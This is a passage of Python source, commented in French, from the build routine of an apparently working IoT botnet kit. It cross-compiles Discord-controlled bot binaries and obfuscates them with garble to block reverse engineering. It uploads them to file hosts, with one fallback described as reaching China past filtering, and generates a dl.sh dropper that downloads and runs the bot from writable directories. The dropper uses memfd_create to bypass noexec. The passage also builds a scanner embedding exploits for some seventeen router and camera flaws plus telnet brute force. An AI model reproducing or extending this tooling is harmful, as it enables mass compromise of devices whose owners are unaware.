            guess = next((p for p in _candidates if Path(p).exists()), '/home/kali/go/bin/go1.16')
            inp = cinput(f"  > Chemin go1.16 [Entrée = {guess}] : ", C.WHITE).strip()
            go116_path = inp if inp else guess
            if not Path(go116_path).exists():
                cprint(f"  [!] go1.16 introuvable : {go116_path}", C.RED)
                cprint(f"  [i] ~/go/bin/go1.16 download", C.CYAN)
                go116_path = None
            else:
                cprint(f"  [+] go1.16 : {go116_path}", C.GREEN)

        # AES-256-GCM encrypt credentials → patch temporaire de bot_discord.go
        # Les valeurs sont dans le même fichier → garble les traite ensemble correctement.
        cprint(f"\n  [*] Chiffrement AES-256-GCM credentials...", C.YELLOW)
        bot_original = Path('bot_discord.go').read_text()
        try:
            frags = aes_encrypt_credentials(
                self.cfg.token or '',
                self.cfg.channel_id or '',
                self.cfg.guild_id or '',
            )
            patched = bot_original
            import re as _re
            for var, val in frags.items():
                # Gérer les var avec alignement (ex: `_n  = ""` avec 2 espaces)
                patched = _re.sub(
                    rf'{_re.escape(var)}\s*=\s*""',
                    f'{var} = "{val}"',
                    patched, count=1
                )
            Path('bot_discord.go').write_text(patched)
            cprint(f"  [+] Credentials AES-256-GCM baked dans bot_discord.go ✓", C.GREEN)
        except ImportError:
            cprint("  [!] cryptography non installé → pip install cryptography", C.RED)
            cinput("  > Build annulé. Entrée..."); return

        beacon = self.cfg.beacon_addr or ''
        ldflags_common = (
            f"-s -w -buildid="
            + (f" -X main._b={beacon}" if beacon else "")
        )
        # -trimpath retire les chemins sources absolus du binaire (build paths)
        _trimpath_flag = ['-trimpath']

        # Garble — OBLIGATOIRE pour empêcher reverse Ghidra/IDA
        # Cherche garble : PATH, $GOPATH/bin, ~/go/bin, go env GOPATH
        def _find_garble() -> str | None:
            # 1. PATH standard
            p = shutil.which('garble')
            if p: return p
            # 2. ~/go/bin (défaut go install sans GOPATH custom)
            home_go = Path.home() / 'go' / 'bin' / 'garble'
            if home_go.exists(): return str(home_go)
            # 3. $GOPATH/bin si variable définie
            gopath_env = os.environ.get('GOPATH', '')
            if gopath_env:
                gp = Path(gopath_env) / 'bin' / 'garble'
                if gp.exists(): return str(gp)
            # 4. go env GOPATH
            try:
                r = subprocess.run([_GO_BIN, 'env', 'GOPATH'], capture_output=True, text=True)
                if r.returncode == 0:
                    gp = Path(r.stdout.strip()) / 'bin' / 'garble'
                    if gp.exists(): return str(gp)
            except FileNotFoundError:
                pass
            return None

        _garble_bin = _find_garble()
        _garble = _garble_bin is not None
        if _garble:
            cprint(f"  [+] garble détecté ({_garble_bin}) → build obfusqué", C.GREEN)
        else:
            cprint(f"\n  {C.YELLOW}[~] garble absent — installation automatique...{C.RESET}")
            inst = subprocess.run([_GO_BIN, 'install', 'mvdan.cc/garble@latest'],
                                  capture_output=True, text=True)
            if inst.returncode == 0:
                _garble_bin = _find_garble()
                _garble = _garble_bin is not None
                if _garble:
                    cprint(f"  [+] garble installé et détecté ({_garble_bin}) ✓", C.GREEN)
                else:
                    cprint(f"  [!] installé mais introuvable — PATH peut-être non mis à jour", C.RED)
            else:
                cprint(f"  [!] Installation garble échouée :", C.RED)
                for line in (inst.stdout + inst.stderr).strip().splitlines()[:3]:
                    cprint(f"      {line}", C.RED)
            if not _garble:
                r = cinput(f"\n  > Continuer sans garble (DÉCONSEILLÉ) ? [o/N] : ", C.WHITE).strip().lower()
                if r != 'o':
                    cinput("  > Build annulé. Entrée..."); return

        # Affiche Go détecté et sa version
        _go_ver = subprocess.run([_GO_BIN, 'version'], capture_output=True, text=True)
        _go_version_str = _go_ver.stdout.strip() if _go_ver.returncode == 0 else 'unknown'
        cprint(f"\n  [*] Go détecté : {_GO_BIN}", C.CYAN)
        cprint(f"      {_go_version_str}", C.CYAN)

        # 1. go mod tidy
        cprint(f"\n  [*] go mod tidy...", C.YELLOW)
        run([_GO_BIN, 'mod', 'tidy'])

        # 2. Build bots Discord (cross-compile)
        Path(BUILD_DIR).mkdir(exist_ok=True)
        Path(LEGACY_DIR).mkdir(parents=True, exist_ok=True)
        cprint(f"\n  [*] Compilation des bots Discord → {BUILD_DIR}/ et {LEGACY_DIR}/...\n", C.YELLOW)
        built_bots: list[tuple[str, str]] = []  # (arch_key, out_name)

        # Assure que garble trouve Go 1.26+
        _base_env = os.environ.copy()
        _go_bin_dir = '/usr/local/go/bin'
        if _go_bin_dir not in _base_env.get('PATH', ''):
            _base_env['PATH'] = _go_bin_dir + os.pathsep + _base_env.get('PATH', '')

        for attr, label, goos, goarch, extra_env, out_name in ARCHS:
            if not getattr(self.cfg, attr):
                continue
            env_vars = _base_env.copy()
            env_vars['GOOS']        = goos
            env_vars['GOARCH']      = goarch
            env_vars['CGO_ENABLED'] = '0'
            if _garble: env_vars['GOGARBLE'] = '*'
            env_vars.update(extra_env)
            _go = _garble_bin if _garble else _GO_BIN
            _args = ['-literals', '-tiny', '-seed=random'] if _garble else []
            cmd = [_go] + _args + ['build', f'-ldflags={ldflags_common}'] + _trimpath_flag + ['-o', out_name, 'bot_discord.go']
            try:
                r = subprocess.run(cmd, env=env_vars, capture_output=True, text=True)
                if r.returncode == 0:
                    size = Path(out_name).stat().st_size // 1024
                    cprint(f"  [+] {label:<32} → {out_name} ({size} KB) ✓", C.GREEN)
                    strip_elf_sections(out_name)
                    built_bots.append((attr, out_name))
                else:
                    cprint(f"  [!] {label:<32} ÉCHEC", C.RED)
                    for line in (r.stdout + r.stderr).strip().splitlines()[:4]:
                        cprint(f"      {line}", C.RED)
            except FileNotFoundError:
                cprint(f"  [!] go non trouvé", C.RED)

        # Upload après tests QEMU (plus bas dans le code)
        bot_urls = {}
        bot_urls_b = {}

        # 3b. Build legacy (go1.16) — compatibles kernel < 3.17
        legacy_urls = {}
        go116 = go116_path
        if go116:
            cprint(f"\n  {C.YELLOW}── Build legacy (go1.16 / kernel < 3.17) ──{C.RESET}")
            cprint("  [*] go1.16 mod download (sync go.sum)...", C.CYAN)
            subprocess.run(
                ['sudo', go116, 'mod', 'download'],
                cwd=Path(__file__).parent,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            legacy_targets = [
                ('linux', 'amd64',  {},                            f'{LEGACY_DIR}/bot.x86_64.legacy',  'arch_x86_64', 'main._urlAmd64Legacy'),
                ('linux', '386',    {},                            f'{LEGACY_DIR}/bot.x86.legacy',     'arch_x86',    'main._urlX86Legacy'),
                ('linux', 'arm',    {'GOARM': '7'},                f'{LEGACY_DIR}/bot.arm.legacy',     'arch_arm',    'main._urlArmLegacy'),
                ('linux', 'arm',    {'GOARM': '5'},                f'{LEGACY_DIR}/bot.armv5.legacy',   'arch_armv5',  'main._urlArmv5Legacy'),
                ('linux', 'arm64',  {},                            f'{LEGACY_DIR}/bot.arm64.legacy',   'arch_arm64',  'main._urlArm64Legacy'),
                ('linux', 'mips',   {'GOMIPS': 'softfloat'},       f'{LEGACY_DIR}/bot.mips.legacy',    'arch_mips',   'main._urlMipsLegacy'),
                ('linux', 'mipsle', {'GOMIPS': 'softfloat'},       f'{LEGACY_DIR}/bot.mipsle.legacy',  'arch_mipsle', 'main._urlMipsleLegacy'),
                ('linux', 'ppc64',  {},                            f'{LEGACY_DIR}/bot.ppc.legacy',     'arch_ppc',    'main._urlPpcLegacy'),
            ]
            for goos, goarch, extra, out, attr, ldfvar in legacy_targets:
                if not getattr(self.cfg, attr, False):
                    continue
                env_vars = _base_env.copy()
                env_vars['GOOS'] = goos; env_vars['GOARCH'] = goarch; env_vars['CGO_ENABLED'] = '0'
                env_vars.update(extra)
                cmd = [go116, 'build', f'-ldflags={ldflags_common}'] + _trimpath_flag + ['-o', out, 'bot_discord.go']
                r = subprocess.run(cmd, env=env_vars, capture_output=True, text=True)
                if r.returncode == 0:
                    size = Path(out).stat().st_size // 1024
                    cprint(f"  [+] legacy {goarch:<8} → {out} ({size} KB) ✓", C.GREEN)
                    strip_elf_sections(out)
                    # Upload après tests QEMU — on stocke juste (ldfvar, attr, out)
                    built_bots.append((attr, out))
                    legacy_urls[ldfvar] = ('PENDING', attr, out)
                else:
                    cprint(f"  [!] legacy {goarch} ÉCHEC", C.RED)
                    for line in (r.stdout + r.stderr).strip().splitlines()[:3]:
                        cprint(f"      {line}", C.RED)
        else:
            if do_legacy:
                cprint(f"  [!] Build legacy ignoré (go1.16 introuvable).", C.RED)

        # Restaurer bot_discord.go maintenant (avant QEMU — fiber sera buildé après upload)
        Path('bot_discord.go').write_text(bot_original)
        for tmp in ['_creds_gen.go', '_creds_fiber_gen.go']:
            try: Path(tmp).unlink()
            except FileNotFoundError: pass

        cprint("\n  [+] Build terminé.", C.GREEN)

        # 4. Test QEMU de tous les binaires compilés
        cprint(f"\n  {C.YELLOW}── Test QEMU des binaires ──{C.RESET}")
        qemu_map = {
            f'{BUILD_DIR}/bot.mips':          ('qemu-mips',    'mips'),
            f'{BUILD_DIR}/bot.mipsle':        ('qemu-mipsel',  'mipsle'),
            f'{BUILD_DIR}/bot.arm':           ('qemu-arm',     'arm'),
            f'{BUILD_DIR}/bot.armv5':         ('qemu-arm',     'armv5'),
            f'{BUILD_DIR}/bot.arm64':         ('qemu-aarch64', 'arm64'),
            f'{BUILD_DIR}/bot.x86_64':        ('qemu-x86_64',  'x86_64'),
            f'{BUILD_DIR}/bot.x86':           ('qemu-i386',    'x86'),
            f'{BUILD_DIR}/bot.ppc':           ('qemu-ppc64',   'ppc'),
            f'{LEGACY_DIR}/bot.mips.legacy':   ('qemu-mips',    'mips-legacy'),
            f'{LEGACY_DIR}/bot.mipsle.legacy': ('qemu-mipsel',  'mipsle-legacy'),
            f'{LEGACY_DIR}/bot.arm.legacy':    ('qemu-arm',     'arm-legacy'),
            f'{LEGACY_DIR}/bot.armv5.legacy':  ('qemu-arm',     'armv5-legacy'),
            f'{LEGACY_DIR}/bot.arm64.legacy':  ('qemu-aarch64', 'arm64-legacy'),
            f'{LEGACY_DIR}/bot.x86_64.legacy': ('qemu-x86_64',  'x86_64-legacy'),
            f'{LEGACY_DIR}/bot.x86.legacy':    ('qemu-i386',    'x86-legacy'),
            f'{LEGACY_DIR}/bot.ppc.legacy':    ('qemu-ppc64',   'ppc-legacy'),
        }
        import time as _time
        any_qemu = False
        qemu_ok: list[tuple[str,str]] = []   # (attr, binary) validés → upload autorisé
        qemu_fail: list[str] = []
        has_creds = bool(self.cfg.token and self.cfg.channel_id)
        for binary, (qemu_bin, label) in qemu_map.items():
            if not Path(binary).exists(): continue
            if not shutil.which(qemu_bin): continue
            any_qemu = True
            # Trouver l'attr correspondant au binaire
            attr = next((a for a, b in built_bots if b == binary), None)
            try:
                # Tester sur une copie — selfHide() déplace l'original sinon
                import tempfile, shutil as _sh
                tmp_bin = tempfile.mktemp(prefix='qemu_test_')
                _sh.copy2(binary, tmp_bin)
                os.chmod(tmp_bin, 0o755)
                proc = subprocess.Popen([qemu_bin, tmp_bin],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # Attendre que le bot se connecte à Discord (10-15s)
                for i in range(15):  # 15 secondes max
                    _time.sleep(1)
                    ret = proc.poll()
                    if ret is not None:  # Processus terminé
                        break
                    if i >= 9:  # Après 10s, afficher que le bot attend
                        if i == 9:
                            cprint(f"    {C.CYAN}(en attente de connexion Discord...){C.RESET}", C.CYAN)
                else:
                    ret = proc.poll()  # Dernier check
                if ret is None:
                    proc.kill(); proc.wait()
                    cprint(f"  {C.GREEN}[✓]{C.RESET} {label:<20} connecté / en attente", C.GREEN)
                    if attr: qemu_ok.append((attr, binary))
                elif ret in (0, 1) and not has_creds:
                    cprint(f"  {C.GREEN}[✓]{C.RESET} {label:<20} binaire sain (pas de creds)", C.GREEN)
                    if attr: qemu_ok.append((attr, binary))
                elif ret == 0 and has_creds:
                    cprint(f"  {C.GREEN}[✓]{C.RESET} {label:<20} binaire sain (exit propre)", C.GREEN)
                    if attr: qemu_ok.append((attr, binary))
                elif ret == 2 and has_creds:
                    cprint(f"  {C.YELLOW}[~]{C.RESET} {label:<20} creds chargés, panic QEMU (normal)", C.YELLOW)
                    if attr: qemu_ok.append((attr, binary))
                else:
                    cprint(f"  {C.RED}[✗]{C.RESET} {label:<20} crash inattendu (code {ret})", C.RED)
                    qemu_fail.append(label)
            except Exception as e:
                cprint(f"  {C.YELLOW}[?]{C.RESET} {label:<20} erreur : {e}", C.YELLOW)
            finally:
                try: os.unlink(tmp_bin)
                except Exception: pass
        if not any_qemu:
            cprint(f"  {C.YELLOW}[i] Aucun qemu-* trouvé — tests ignorés, upload direct{C.RESET}")
            qemu_ok = built_bots  # pas de QEMU = on upload quand même
        if qemu_fail:
            cprint(f"\n  {C.RED}[!] {len(qemu_fail)} binaire(s) en échec réel — non uploadés{C.RESET}")

        # ── Attendre connexion de chaque bot QEMU avant upload ──
        to_upload = qemu_ok if qemu_ok else []
        if qemu_fail:
            cprint(f"\n  {C.RED}[!] Upload annulé — {len(qemu_fail)} binaire(s) en échec réel.{C.RESET}")
            to_upload = []

        if to_upload:
            cprint(f"\n  {C.YELLOW}── Approbation bot par bot (QEMU timeout +30s) ──{C.RESET}")
            cprint(f"  {C.CYAN}Chaque bot doit se connecter à Discord avant de continuer.{C.RESET}")
            cprint(f"  {C.CYAN}Veille sur le channel Discord pour voir les [+] NEW BOT ONLINE{C.RESET}\n")
            for i, (attr, binary) in enumerate(to_upload, 1):
                label = binary.split('/')[-1]
                cprint(f"  {C.YELLOW}[{i}/{len(to_upload)}]{C.RESET} {label}")
                cinput(f"  {C.CYAN}> Appuyer sur Entrée une fois que {label} s'est connecté à Discord (ou Ctrl+C pour skip){C.RESET}")
                cprint(f"  {C.GREEN}[✓] {label} approuvé{C.RESET}\n")

        # 3b. Upload des binaires validés par QEMU
        # Upload seulement si TOUS les tests sont passés (aucun échec réel)
        if to_upload and self.cfg.distrib_mode == 'auto':
            # Séparer primaires et legacy pour avoir les deux URLs dans dl.sh
            primary_uploads = [(a, o) for a, o in to_upload if 'legacy' not in o]
            legacy_uploads  = [(a, o) for a, o in to_upload if 'legacy' in o]
            if not primary_uploads:
                primary_uploads = to_upload  # fallback si pas de distinction

            cprint(f"\n  {C.YELLOW}── Upload selfhost (primaire) ──{C.RESET}")
            bot_urls = self._upload_bots(primary_uploads, '1')
            cprint(f"\n  {C.YELLOW}── Upload CDN catbox (fallback GFW/filtrage) ──{C.RESET}")
            # Force catbox même si selfhost est configuré — CDN accessible depuis Chine/partout
            _sh_backup = self.cfg.self_host_url
            self.cfg.self_host_url = ''   # désactive selfhost pour ce passage
            self._uploading_backup = True
            bot_urls_b = self._upload_bots(primary_uploads, '1')  # → catbox/litterbox/filebin
            self._uploading_backup = False
            self.cfg.self_host_url = _sh_backup  # restaure

            # Upload legacy séparément pour avoir leurs vraies URLs (bot_urls_legacy)
            bot_urls_legacy: dict[str, str] = {}
            if legacy_uploads:
                cprint(f"\n  {C.YELLOW}── Upload binaires legacy ──{C.RESET}")
                bot_urls_legacy = self._upload_bots(legacy_uploads, '1')

            # Résoudre les legacy_urls PENDING avec les URLs legacy réelles
            for ldfvar, val in list(legacy_urls.items()):
                if isinstance(val, tuple) and val[0] == 'PENDING':
                    _, attr, out = val
                    url   = bot_urls_legacy.get(attr, '') or bot_urls.get(attr, '')
                    url_b = bot_urls_legacy.get(attr, '') or bot_urls_b.get(attr, '')
                    if url:   legacy_urls[ldfvar] = url
                    else:     del legacy_urls[ldfvar]
                    if url_b: legacy_urls[ldfvar + 'B'] = url_b
        elif to_upload and self.cfg.distrib_mode == 'local':
            cprint(f"\n  {C.BLUE}[i] Mode local — fiber servira les binaires.{C.RESET}")
            bot_urls_legacy = {}
            for ldfvar, val in list(legacy_urls.items()):
                if isinstance(val, tuple): del legacy_urls[ldfvar]
        else:
            bot_urls_legacy = {}

        # 4. Build fiber avec URLs embedded (après upload pour avoir les vraies URLs)
        cprint("\n  [*] Build scanner fiber...", C.YELLOW)
        fiber_ldf = '-s -w'
        attr_to_ldflag = {
            'arch_mips':   'main._urlMips',   'arch_mipsle': 'main._urlMipsle',
            'arch_arm':    'main._urlArm',     'arch_armv5':  'main._urlArmv5',
            'arch_arm64':  'main._urlArm64',   'arch_x86':    'main._urlX86',
            'arch_x86_64': 'main._urlAmd64',   'arch_ppc':    'main._urlPpc',
        }
        attr_to_ldflag_b = {
            'arch_mips':   'main._urlMipsB',   'arch_mipsle': 'main._urlMipsleB',
            'arch_arm':    'main._urlArmB',     'arch_armv5':  'main._urlArmv5B',
            'arch_arm64':  'main._urlArm64B',   'arch_x86':    'main._urlX86B',
            'arch_x86_64': 'main._urlAmd64B',   'arch_ppc':    'main._urlPpcB',
        }
        for attr, url in bot_urls.items():
            if url and attr in attr_to_ldflag:
                fiber_ldf += f" -X '{attr_to_ldflag[attr]}={url}'"
        for attr, url in bot_urls_b.items():
            if url and attr in attr_to_ldflag_b:
                fiber_ldf += f" -X '{attr_to_ldflag_b[attr]}={url}'"
        for ldfvar, url in legacy_urls.items():
            if url and not isinstance(url, tuple):
                fiber_ldf += f" -X '{ldfvar}={url}'"
        if beacon:
            fiber_ldf += f' -X main._beaconAddr={beacon}'

        # ── Générer dl.sh dynamique : primaire + legacy en fallback ──
        arch_cases = [
            ('arch_arm64',  '*aarch64*|*arm64*'),
            ('arch_armv5',  '*armv5*|*armv4*'),
            ('arch_arm',    '*arm*'),
            ('arch_mipsle', '*mipsel*|*mips\\ l*'),
            ('arch_mips',   '*mips*'),
            ('arch_x86_64', '*x86_64*|*amd64*'),
            ('arch_x86',    '*i686*|*i386*'),
            ('arch_ppc',    '*ppc*'),
        ]
        fallback_url = next((bot_urls[a] for a, _ in arch_cases if bot_urls.get(a)), '')
        if not fallback_url:
            fallback_url = next(iter(bot_urls.values()), '') if bot_urls else ''
        fallback_leg  = next((bot_urls_legacy[a] for a, _ in arch_cases if bot_urls_legacy.get(a)), '')

        if bot_urls or bot_urls_legacy:
            lines = ['#!/bin/sh']
            lines.append("A=$(uname -m 2>/dev/null|tr '[:upper:]' '[:lower:]'||echo arm)")
            lines.append('case "$A" in')
            for attr, pat in arch_cases:
                p   = bot_urls.get(attr, '') or fallback_url
                cdn = bot_urls_b.get(attr, '')
                l   = bot_urls_legacy.get(attr, '') or fallback_leg
                # Ordre : selfhost -> CDN (joignable GFW) -> legacy
                urls_str = ' '.join(dict.fromkeys(u for u in [p, cdn, l] if u))
                if urls_str:
                    lines.append(f'  {pat}) URLS="{urls_str}" ;;')
            fb_cdn = next(iter(bot_urls_b.values()), '') if bot_urls_b else ''
            fb_all = ' '.join(u for u in [fallback_url, fb_cdn, fallback_leg] if u)
            lines.append(f'  *) URLS="{fb_all or fallback_url}" ;;')
            lines.append('esac')
            # _dl essaie chaque URL dans URLS jusqu'à obtenir un fichier valide
            lines.append('_dl(){')
            lines.append('  for _u in $URLS; do')
            lines.append('    wget -qT10 -O "$1" "$_u" 2>/dev/null||curl -fsL --max-time 10 -o "$1" "$_u" 2>/dev/null||busybox wget -qT10 -O "$1" "$_u" 2>/dev/null')
            lines.append('    _sz=$(wc -c <"$1" 2>/dev/null||busybox wc -c <"$1" 2>/dev/null||ls -la "$1" 2>/dev/null|awk \'{print $5}\'||echo 0)')
            lines.append('    [ "${_sz:-0}" -gt 5000 ] 2>/dev/null && return 0')
            lines.append('    rm -f "$1" 2>/dev/null')
            lines.append('  done; return 1')
            lines.append('}')
            lines.append('_run(){')
            lines.append('  _dl "$1/.b" || return 1')
            lines.append('  chmod +x "$1/.b" 2>/dev/null')
            lines.append('  "$1/.b" & sleep 2; kill -0 $! 2>/dev/null && return 0')
            # Tente tous les interpréteurs dynamiques connus (ARMHF, ARMEL, musl, MIPS, etc.)
            lines.append('  for LD in /lib/ld-linux-armhf.so.3 /lib/ld-linux.so.3 /lib/ld-linux.so.2 /lib/ld-musl-armhf.so.1 /lib/ld-musl-arm.so.1 /lib/ld-uClibc.so.0 /lib/ld-musl-mips.so.1 /lib/ld-musl-mipsel.so.1 /lib64/ld-linux-x86-64.so.2 /lib/ld*.so* /lib64/ld*.so* /usr/lib/ld*.so*; do')
            lines.append('    [ -x "$LD" ] || continue')
            lines.append('    "$LD" "$1/.b" & sleep 2; kill -0 $! 2>/dev/null && return 0')
            lines.append('  done')
            # Dernier recours : python3 memfd_create (bypass noexec total, kernel ≥3.17)
            lines.append('  python3 -c "import os,sys;fd=os.memfd_create(\'.b\',1);d=open(sys.argv[1],\'rb\').read();os.write(fd,d);os.execv(\'/proc/self/fd/\'+str(fd),[\'.b\'])" "$1/.b" 2>/dev/null &')
            lines.append('  sleep 3; kill -0 $! 2>/dev/null && return 0')
            lines.append('  rm -f "$1/.b"; return 1')
            lines.append('}')
            lines.append('for D in /tmp /var/tmp /dev/shm /dev /var/run /mnt; do')
            lines.append('  [ -w "$D" ] || continue')
            lines.append('  _run "$D" && exit 0')
            lines.append('done')
            dlsh_content = '\n'.join(lines) + '\n'

            import tempfile as _tmpfile
            with _tmpfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='dlsh_') as tf:
                tf.write(dlsh_content)
                dlsh_tmp = tf.name

            cprint(f"\n  [*] Upload dl.sh dynamique (URLs par arch embedded)...", C.YELLOW)
            dlsh_url = ''
            if self.cfg.self_host_url:
                dlsh_url = self._upload_one(dlsh_tmp, 'dl.sh')
            if not dlsh_url:
                # Fallback catbox
                import subprocess as _sp
                r = _sp.run(['curl', '-s', '-F', 'reqtype=fileupload', '-F', 'userhash=',
                             '-F', f'fileToUpload=@{dlsh_tmp}', 'https://catbox.moe/user/api.php'],
                            capture_output=True, text=True)
                if r.stdout.strip().startswith('http'):
                    dlsh_url = r.stdout.strip()
            try:
                import os as _os; _os.unlink(dlsh_tmp)
            except Exception:
                pass

            if dlsh_url:
                cprint(f"  [+] dl.sh dynamique → {dlsh_url}", C.GREEN)
                fiber_ldf += f" -X 'main._dlShURL={dlsh_url}'"
            else:
                cprint(f"  [!] Upload dl.sh échoué — CVE exploits sans dropper", C.RED)
        fiber_original = Path('fiber.go').read_text()
        if self.cfg.token and self.cfg.channel_id:
            frags_f = aes_encrypt_credentials_fiber(
                self.cfg.token, self.cfg.channel_id, self.cfg.guild_id or '')
            patched_f = fiber_original
            for var, val in frags_f.items():
                patched_f = _re.sub(
                    rf'{_re.escape(var)}\s*=\s*""',
                    f'{var} = "{val}"',
                    patched_f, count=1
                )
            Path('fiber.go').write_text(patched_f)
        _fiber_go = _garble_bin if _garble else 'go'
        _fiber_args = ['-literals', '-tiny', '-seed=random'] if _garble else []
        code, out = run([_fiber_go] + _fiber_args + ['build', f'-ldflags={fiber_ldf} -buildid='] + _trimpath_flag + ['-o', 'fiber', 'fiber.go'], capture=True)
        if code == 0:
            cprint("  [+] fiber compilé ✓ (URLs des binaires embedded)", C.GREEN)
            strip_elf_sections('fiber')
        else:
            cprint(f"  [!] Erreur fiber :\n{out[:400]}", C.RED)
        Path('fiber.go').write_text(fiber_original)

        cprint(f"\n  {C.YELLOW}── CVEs / exploits embarqués dans fiber ──{C.RESET}")
        cves = [
            "D-Link RCE (apply.cgi / ping.cgi)",
            "Netgear RCE (setup.cgi syscmd)",
            "IP Camera RCE (system.ini / command.php)",
            "TP-Link RCE (/cgi?2)",
            "Huawei HG532 (CVE-2017-17215, UPnP SOAP)",
            "ZTE RCE (web_shell_cmd.gch)",
            "Hikvision (CVE-2021-36260, SDK/webLanguage)",
            "DVR TVT/HiSilicon (CVE-2018-9995, bypass auth)",
            "ZyXEL P660HN (CVE-2017-18368)",
            "MVPower DVR (CVE-2016-20016, /shell)",
            "GPON Dasan/Huawei (CVE-2018-10561/10562)",
            "Realtek SDK (CVE-2021-35395, formSysCmd)",
            "Belkin/Linksys (CVE-2019-12780, ping RCE)",
            "Zyxel Firewall (CVE-2022-30525, /ztp/handler)",
            "D-Link DNS-320 (CVE-2020-25506, nas_sharing)",
            "ThinkPHP 5.x RCE (invokefunction)",
            "Telnet brute-force (credentials IoT communs)",
            "Ping injection (formPing)",
        ]
        for c in cves:
            cprint(f"  {C.GREEN}[✓]{C.RESET} {c}")
        cprint(f"\n  {C.CYAN}[i] Lance le scanner depuis le menu Services → Démarrer fiber.{C.RESET}")

        # ── Nettoyage des binaires uploadés (libère l'espace disque) ────────
        if self.cfg.distrib_mode == 'auto' and to_upload:
            cprint(f"\n  {C.YELLOW}── Nettoyage binaires uploadés ──{C.RESET}")
            cleaned_bytes = 0
            for _, binary in to_upload:
                try:
                    p = Path(binary)
                    if p.exists():
                        sz = p.stat().st_size
                        p.unlink()
                        cleaned_bytes += sz
                        cprint(f"  {C.YELLOW}[~]{C.RESET} Supprimé {binary} ({sz // 1024} KB)", C.RESET)
                except Exception:
                    pass
            # Supprimer aussi les répertoires build/ s'ils sont vides
            for d in [LEGACY_DIR, BUILD_DIR]:
                try:
                    dp = Path(d)
                    if dp.exists() and not any(dp.iterdir()):
                        dp.rmdir()
                except Exception:
                    pass
            if cleaned_bytes:
                cprint(f"  {C.GREEN}[+] {cleaned_bytes // 1024} KB libérés ✓{C.RESET}", C.GREEN)
            else:
                cprint(f"  {C.YELLOW}[~] Rien à nettoyer{C.RESET}", C.YELLOW)

        cinput("\n  > Entrée pour continuer...")

    def _send_discord_approval(self, message: str, timeout: int = 60) -> bool:
        """Envoie un message Discord et attends une réaction ✅ pour approuver.
        Retourne True si approuvé, False si timeout/refusé."""
        import json as _json, urllib.request as _req, urllib.error as _err, time as _time

        url = f"https://discord.com/api/v10/channels/{self.cfg.channel_id}/messages"
        headers = {
            "Authorization": f"Bot {self.cfg.token}",
            "Content-Type": "application/json"
        }

        # Envoyer le message
        data = {"content": message}
        req = _req.Request(url, data=_json.dumps(data).encode(), headers=headers, method='POST')
        try:
            with _req.urlopen(req, timeout=10) as r:
                resp = _json.loads(r.read())
                msg_id = resp.get('id')
                if not msg_id:
                    cprint(f"  {C.RED}[!] Erreur envoi Discord{C.RESET}", C.RED)
                    return None
        except _err.HTTPError as e:
            error_msg = e.read().decode() if e.fp else str(e)
            if e.code == 403:
                cprint(f"  {C.RED}[!] Erreur 403 Forbidden — vérifier:{C.RESET}")
                cprint(f"      • Bot permissions sur le channel (send messages, add reactions)")
                cprint(f"      • Channel ID correct: {self.cfg.channel_id}")
                cprint(f"      • Token bot valide: {self.cfg.token[:20]}...")
            elif e.code == 404:
                cprint(f"  {C.RED}[!] Erreur 404 — channel {self.cfg.channel_id} introuvable{C.RESET}")
            elif e.code == 401:
                cprint(f"  {C.RED}[!] Erreur 401 — token bot invalide/expiré{C.RESET}")
            else:
                cprint(f"  {C.RED}[!] Discord error {e.code}: {error_msg[:100]}{C.RESET}")
            return None
        except Exception as e:
            cprint(f"  {C.RED}[!] Discord offline: {e}{C.RESET}", C.RED)
            return None

        # Ajouter réaction ✅
        react_url = f"https://discord.com/api/v10/channels/{self.cfg.channel_id}/messages/{msg_id}/reactions/%E2%9C%85/@me"
        react_req = _req.Request(react_url, headers=headers, method='PUT')
        try:
            _req.urlopen(react_req, timeout=10)
        except Exception:
            pass

        # Attendre réaction utilisateur (polling)
        cprint(f"  {C.CYAN}En attente d'approbation Discord (timeout {timeout}s)...{C.RESET}")
        start = _time.time()
        while _time.time() - start < timeout:
            try:
                # Récupérer les réactions du message
                get_url = f"https://discord.com/api/v10/channels/{self.cfg.channel_id}/messages/{msg_id}/reactions"
                get_req = _req.Request(get_url, headers=headers)
                with _req.urlopen(get_req, timeout=10) as r:
                    reactions = _json.loads(r.read())
                    # Chercher une réaction ✅ avec count > 0
                    for reaction in reactions:
                        if reaction.get('emoji', {}).get('name') == '✅' and reaction.get('count', 0) > 0:
                            cprint(f"  {C.GREEN}[+] Approuvé ✅{C.RESET}")
                            return True
            except Exception:
                pass
            _time.sleep(2)  # Poll toutes les 2 secondes

        cprint(f"  {C.YELLOW}[~] Timeout — pas d'approbation Discord{C.RESET}")
        return False

    def _upload_one(self, local_path: str, display_name: str = '') -> str:
        """Upload un fichier unique via selfhost. Retourne l'URL ou '' si échec."""
        if not self.cfg.self_host_url:
            return ''
        base = self.cfg.self_host_url.rstrip('/')
        import subprocess as _sp, json as _j
        r = _sp.run(['curl', '-s', '-F', f'file=@{local_path}', f'{base}/upload.php'],
                    capture_output=True, text=True, timeout=30)
        try:
            data = _j.loads(r.stdout.strip())
            url = data.get('url', '')
            if data.get('success') and url.startswith('http'):
                return url
        except Exception:
            pass
        return ''

    def _upload_bots(self, built_bots: list, host_choice: str) -> dict:
        urls: dict[str, str] = {}
        if host_choice == '3':
            # Saisie manuelle
            for attr, out_name in built_bots:
                url = cinput(f"  URL pour {out_name} : ", C.WHITE).strip()
                if url: urls[attr] = url
            return urls

        def _curl(cmd: list, label: str = '') -> str:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                out = (r.stdout or '').strip()
                if not out.startswith('http') and out:
                    cprint(f"      {C.YELLOW}↳ réponse: {out[:120]}{C.RESET}", C.YELLOW)
                return out
            except subprocess.TimeoutExpired:
                cprint(f"      {C.RED}↳ timeout 30s{C.RESET}", C.RED)
                return ''
            except Exception as e:
                cprint(f"      {C.RED}↳ erreur: {e}{C.RESET}", C.RED)
                return ''

        def upload_catbox(f: str) -> str:
            out = _curl(['curl', '-s', '-F', 'reqtype=fileupload', '-F', 'userhash=',
                         '-F', f'fileToUpload=@{f}', 'https://catbox.moe/user/api.php'])
            return out if out.startswith('http') else ''

        def upload_litterbox(f: str) -> str:
            # catbox temporaire 72h — même infra, plus souple
            out = _curl(['curl', '-s', '-F', 'reqtype=fileupload', '-F', 'time=72h',
                         '-F', f'fileToUpload=@{f}',
                         'https://litterbox.catbox.moe/resources/internals/api.php'])
            return out if out.startswith('http') else ''

        def upload_selfhost(f: str) -> str:
